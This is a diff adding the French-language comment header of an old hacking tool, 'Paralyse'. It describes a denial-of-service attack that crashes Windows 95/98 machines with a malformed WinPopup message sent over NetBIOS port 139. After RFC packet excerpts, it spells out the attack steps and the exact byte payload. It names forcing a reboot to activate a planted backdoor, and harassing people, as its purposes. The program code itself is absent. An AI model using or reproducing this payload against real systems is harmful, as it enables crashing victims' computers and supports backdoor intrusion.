@@ -1,0 +1,248 @@
+//                                Paralyse
+
+#define AUTEUR "SLy"
+#define GROUPE "rtc"
+#define EMAIL "rtcSLy@yahoo.fr"
+
+/*
+Qu'est-ce que c'est ?
+
+	C'est un DoS (qui cause donc un petit reboot de la machine distant :)
+ contre win 95 et 98 grƒce a un etrange message winpopup qu'on envoie (couche
+ NETBIOS/TCP/IP).
+
+A quoi ca sert ?
+
+	- Tout simplement ca sert si on installe une backdoor qui ne prendra 
+effet que si l'ordinateur d'en face reboot
+	- A faire chier le monde ( = N'est-ce pas lamer ? )
+
+	Faisons le point deja sur le protocol NetBIOS (vous pouvez aller voir 
+les RFC 1001 et surtout 1002 pour voir la structure de tous les type de paquet
+ NetBIOS) mais surtout sur le type de paquet que nous allons employer.
+------------------------------------------------------------------------------
+
+Toutes les messages des sessions sont envoyes a travers une connection TCP.
+
+   Tous les paquets de session sont de la forme generale suivante : 
+
+                      1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
+    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |      TYPE     |     FLAGS     |            LENGTH             |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |                                                               |
+   /               TRAILER (ca depend du type de paquet)           /
+   |                                                               |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+   Le TYPE, FLAGS, and LENGTH champs sont present dans tous les paquets pour 
+une session NetBIOS.
+------------------------------------------------------------------------------
+
+   The LENGTH field is the number of bytes following the LENGTH
+   field.  In other words, LENGTH is the combined size of the
+   TRAILER field(s).  For example, the POSITIVE SESSION RESPONSE
+   packet always has a LENGTH field value of zero (0000) while the
+   RETARGET SESSION RESPONSE always has a LENGTH field value of six
+   (0006).
+
+   One of the bits of the FLAGS field acts as an additional, high-
+   order bit for the LENGTH field.  Thus the cumulative size of the
+   trailer field(s) may range from 0 to 128K bytes.
+
+
+
+Session Packet Types (in hexidecimal):
+
+           00 -  SESSION MESSAGE
+           81 -  SESSION REQUEST
+           82 -  POSITIVE SESSION RESPONSE
+           83 -  NEGATIVE SESSION RESPONSE
+           84 -  RETARGET SESSION RESPONSE
+           85 -  SESSION KEEP ALIVE
+
+   Bit definitions of the FLAGS field:
+
+     0   1   2   3   4   5   6   7
+   +---+---+---+---+---+---+---+---+
+   | 0 | 0 | 0 | 0 | 0 | 0 | 0 | E |
+   +---+---+---+---+---+---+---+---+
+
+   Symbole     Bit(s)  Description
+
+   E               7   Length extension, used as an additional,
+                       high-order bit on the LENGTH field.
+
+   RESERVED      0-6   Reserved, must be zero (0)
+
+4.3.2.  SESSION REQUEST PACKET
+
+                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
+    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |      TYPE     |     FLAGS     |            LENGTH             |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |                                                               |
+   /                          CALLED NAME                          /
+   |                                                               |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |                                                               |
+   /                          CALLING NAME                         /
+   |                                                               |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+
+4.3.3.  POSITIVE SESSION RESPONSE PACKET
+
+                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
+    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |      TYPE     |     FLAGS     |            LENGTH             |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+4.3.4.  NEGATIVE SESSION RESPONSE PACKET
+
+                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
+    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |      TYPE     |     FLAGS     |            LENGTH             |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |   ERROR_CODE  |
+   +-+-+-+-+-+-+-+-+
+
+   NEGATIVE SESSION RESPONSE packet error code values (in
+   hexidecimal):
+
+           80 -  Not listening on called name
+           81 -  Not listening for calling name
+           82 -  Called name not present
+           83 -  Called name present, but insufficient resources
+           8F -  Unspecified error
+
+[...]
+(Je montre que ce qui sera utile plus loin)
+
+4.3.6.  SESSION MESSAGE PACKET
+
+                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
+    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |      TYPE     |     FLAGS     |            LENGTH             |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |                                                               |
+   /                                                               /
+   /                           USER_DATA                           /
+   /                                                               /
+   |                                                               |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+------------------------------------------------------------------------------
+
+
+Comment ca marche ?
+
+ - On se connecte au port 139 de la victime. 
+ - On demande un requête de session de NetBIOS (session request packet) du 
+genre
+
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   | TYPE = "\x81" |  FLAGS = 0    |  LENGTH = "\x00\x43" (= 67 )  |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |                                                               |
+   /    CALLED NAME   ( + separation = 2 octets : \x00\x20  )      /
+   |                                                               |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |                                                               |
+   /                CALLING NAME  ( + end = 1 octet : \x00 )       /
+   |                                                               |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+ATTENTION : Le champs CALLED NAME et CALLING NAME doivent contenir des noms
+NetBIOS (de 15 lettres au maximum) en ayant ete convertis d'une certaine 
+facon (pris dans la RFC 1001 et pas tres dur a comprendre):
+D'ailleurs la fonction NetBIOS_Name dans paralyse.c s'en occupera
+-------------------------------------------------------------------------------
+ 
+   The 16 byte NetBIOS name is mapped into a 32 byte wide field using a
+   reversible, half-ASCII, biased encoding.  Each half-octet of the
+   NetBIOS name is encoded into one byte of the 32 byte field.  The
+   first half octet is encoded into the first byte, the second half-
+   octet into the second byte, etc.
+
+   Each 4-bit, half-octet of the NetBIOS name is treated as an 8-bit,
+   right-adjusted, zero-filled binary number.  This number is added to
+   value of the ASCII character 'A' (hexidecimal 41).  The resulting 8-
+   bit number is stored in the appropriate byte.  The following diagram
+   demonstrates this procedure:
+
+                         0 1 2 3 4 5 6 7
+                        +-+-+-+-+-+-+-+-+
+                        |a b c d|w x y z|          ORIGINAL BYTE
+                        +-+-+-+-+-+-+-+-+
+                            |       |
+                   +--------+       +--------+
+                   |                         |     SPLIT THE NIBBLES
+                   v                         v
+            0 1 2 3 4 5 6 7           0 1 2 3 4 5 6 7
+           +-+-+-+-+-+-+-+-+         +-+-+-+-+-+-+-+-+
+           |0 0 0 0 a b c d|         |0 0 0 0 w x y z|
+           +-+-+-+-+-+-+-+-+         +-+-+-+-+-+-+-+-+
+                   |                         |
+                   +                         +     ADD 'A'
+                   |                         |
+            0 1 2 3 4 5 6 7           0 1 2 3 4 5 6 7
+           +-+-+-+-+-+-+-+-+         +-+-+-+-+-+-+-+-+
+           |0 1 0 0 0 0 0 1|         |0 1 0 0 0 0 0 1|
+           +-+-+-+-+-+-+-+-+         +-+-+-+-+-+-+-+-+
+
+   This encoding results in a NetBIOS name being represented as a
+   sequence of 32 ASCII, upper-case characters from the set
+   {A,B,C...N,O,P}.
+-------------------------------------------------------------------------------
+
+- Si tous marche bien il nous renvoie une reponse positive pour la session 
+(POSITIVE SESSION RESPONSE PACKET) de type :
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   | TYPE = "\x82" |  FLAGS = 0    |        LENGTH ="\x00\x00"     |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+- On envoit un message avec le protocol SMB (donc NetBIOS avec le TYPE 
+session message ) un message pour winpopup avec un nom NetBIOS NULL du style :
+
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   | TYPE = "\x00" | FLAGS ="\x00" | LENGTH = "\x00\x43" ( = 67 )  |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+   |                      USER_DATA                  (67 octets)   |
+   / = "\x53\x4d\x42\xD0\x00" pour windows           (5 octets)    /
+   / + message nul + "\x00"                          (33 octets)   /
+   / + "\x00\x19\x00"                                (3 octets)    /
+   / + "\x04\x67\x61\x6E\x67\x00\x04\x68\x61\x63\x6B\x65\x72\x00"  /
+   /     pour la source : ici  \\Gang\hacker         (14 octets)   /
+   / + "\x01\x08\x00"                                (3 octets)    /  
+   / + "\x79\x65\x61\x68\x2E\x2E\x2E\x00"            (8 octets)    /
+   /     pour le message : "yeah..."                               /
+   | + "\x00" pour la fin                            (1 octet)     |
+   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+Remarque :
+	- Chaque partie dans le USER_DATA se termine par "\x00"
+	- Pour les \ dans la source, on met "\x04"
+
+ Puis Win 95 ou 98 va montrer un certain nombre de reponse bizarre.
+Tous va être bloquer, rebootera avec le celebre ecran de win quand il plante 
+bien (in english : "the blue screen of death") , de plus il devrait se faire 
+deconnecter normalement.
+
+*/
+
+// Enfin voila un prog :
+// Vous pouvez (vous devez) le modifier a votre guise
+
+//--------------------------------paralyse.c-----------------------------------
+// [ND/ : cf paralyse.c (en bas de l'‚cran)]
+//----------------------------end of paralyse.c--------------------------------
+
+
+//                                                                    By SLy
